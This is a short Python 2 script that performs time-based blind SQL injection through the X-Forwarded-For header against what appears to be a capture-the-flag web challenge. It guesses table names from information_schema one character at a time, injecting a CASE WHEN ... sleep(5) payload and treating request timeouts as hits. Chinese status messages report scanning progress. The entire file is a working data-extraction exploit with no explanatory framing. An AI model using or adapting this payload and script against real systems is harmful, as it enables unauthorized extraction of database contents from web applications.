#coding:utf-8

import requests
import string

url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
chars=string.lowercase+string.uppercase+string.digits+string.punctuation
# print chars

tables_name= ""
tables_group=[]
for cols in range(42,43):
    for i in range(1,100):
        flag=0
        for str in chars:
            headers = {"X-forwarded-for":"'+"+"(select case when (substring((select table_name from information_schema.tables limit 1 offset %d)from %d for 1)='%s') then sleep(5) else 1 end) and '1'='1"%(cols,i,str)}
            try:
                resp=requests.get(url=url,headers=headers,timeout=4)
            except Exception as e:
                tables_name+=str
                flag=1
                print '正在扫描第%d个数据库名，the tablename now is '%(cols+1) ,tables_name
                break
        if flag==0:
            break
    print tables_name
    tables_group.append(tables_name)
    if i==1 and flag==0:
        print '扫描完成'
        break

for i in range(len(tables_group)):
    print tables_group[i]





